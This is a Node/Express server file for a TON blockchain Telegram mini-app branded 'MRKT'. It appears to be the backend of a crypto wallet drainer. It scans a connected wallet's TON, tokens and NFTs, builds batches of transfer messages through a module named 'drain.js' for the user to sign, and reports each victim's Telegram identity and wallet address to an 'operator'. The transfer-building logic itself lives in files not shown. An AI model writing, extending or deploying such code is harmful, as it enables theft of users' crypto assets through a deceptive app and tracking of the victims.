import cors from "cors";
import express from "express";
import { Address } from "@ton/core";
import { z } from "zod";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { config } from "./config.js";
import { planNextBatch } from "./drain.js";
import { notifyOperator } from "./notify.js";
import { scanAccount } from "./tonapi.js";

const app = express();
app.use(cors({ origin: true }));
app.use(express.json());

const miniappDist = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "../../miniapp/dist",
);

app.use(express.static(miniappDist));

app.get("/tonconnect-manifest.json", (_req, res) => {
  res.json({
    url: config.miniappPublicUrl,
    name: "MRKT",
    iconUrl: `${config.serverPublicUrl}/mrkt-icon.png`,
    termsOfUseUrl: "https://mrkt.land",
    privacyPolicyUrl: "https://mrkt.land",
  });
});

const eventSchema = z.object({
  type: z.string(),
  address: z.string().optional(),
  tgUser: z.record(z.unknown()).optional(),
  detail: z.string().optional(),
});

app.post("/api/event", async (req, res) => {
  const parsed = eventSchema.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "bad body" });
    return;
  }
  const { type, address, tgUser, detail } = parsed.data;
  const who =
    tgUser && typeof tgUser.id !== "undefined"
      ? `tg <code>${tgUser.id}</code> ${tgUser.username ? `@${tgUser.username}` : ""}`
      : "unknown";
  const lines = [`<b>${type}</b>`, who];
  if (address) lines.push(`wallet: <code>${address}</code>`);
  if (detail) lines.push(detail);
  try {
    await notifyOperator(lines.join("\n"));
  } catch (e) {
    console.error(e);
  }
  res.json({ ok: true });
});

const buildSchema = z.object({
  address: z.string(),
  cursor: z
    .object({
      jettonOffset: z.number().int().nonnegative(),
      nftOffset: z.number().int().nonnegative(),
      tonDone: z.boolean(),
    })
    .optional(),
});

app.post("/api/build-batch", async (req, res) => {
  const parsed = buildSchema.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "bad body" });
    return;
  }
  try {
    const owner = Address.parse(parsed.data.address);
    const assets = await scanAccount(owner);
    const cursor = parsed.data.cursor ?? { jettonOffset: 0, nftOffset: 0, tonDone: false };
    const batch = planNextBatch(owner, assets, cursor);
    if (!batch) {
      res.json({ done: true, cursor });
      return;
    }
    res.json({
      done: false,
      cursor,
      validUntil: Math.floor(Date.now() / 1000) + 600,
      messages: batch.messages,
      kind: batch.kind,
      summary: batch.summary,
      assets: {
        ton: assets.tonNano.toString(),
        jettonCount: assets.jettons.length,
        nftCount: assets.nfts.length,
      },
    });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: String(e) });
  }
});

app.get("/api/health", (_req, res) => res.json({ ok: true }));

app.get("*", (req, res, next) => {
  if (req.path.startsWith("/api")) return next();
  res.sendFile(path.join(miniappDist, "index.html"), (err) => {
    if (err) next();
  });
});

app.listen(config.port, () => {
  console.log(`server on :${config.port}`);
});
